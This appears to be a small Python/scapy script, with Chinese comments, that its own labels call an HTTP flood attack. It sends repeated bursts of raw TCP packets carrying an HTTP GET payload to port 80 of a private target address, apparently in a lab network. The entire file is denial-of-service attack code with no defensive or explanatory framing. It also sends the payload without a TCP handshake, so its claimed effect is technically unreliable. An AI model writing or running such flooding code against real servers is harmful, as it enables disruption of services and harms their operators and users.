from scapy.all import *
import time





# 定义目标IP地址和端口号
target_ip = "10.0.0.1"
target_port = 80
def get_if():
    ifs = get_if_list()
    iface = None  # "h1-eth0"
    for i in get_if_list():
        if "eth0" in i:
            iface = i
            break;
    if not iface:
        print("Cannot find eth0 interface")
        exit(1)
    return iface
# 构造HTTP GET请求
iface = get_if()
pkt = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
pkt = pkt / IP(dst=target_ip) / TCP(dport=80, sport=random.randint(49152, 65535)) / Raw(
    load="GET / HTTP/1.1\r\nHost: example.com\r\n User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n\r\n")

packet = IP(dst=target_ip) / TCP(dport=target_port) / Raw(
    load="GET / HTTP/1.1\r\nHost: example.com\r\n User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n\r\n")

# 发送大量的HTTP GET请求
for i in range(4):
    sendp(pkt * 100, iface=iface, verbose=False)
    time.sleep(1)
# send(packet*100)  # 发送100个包作为攻击流量

print("HTTP Flood攻击包已发送至目标IP地址：", target_ip)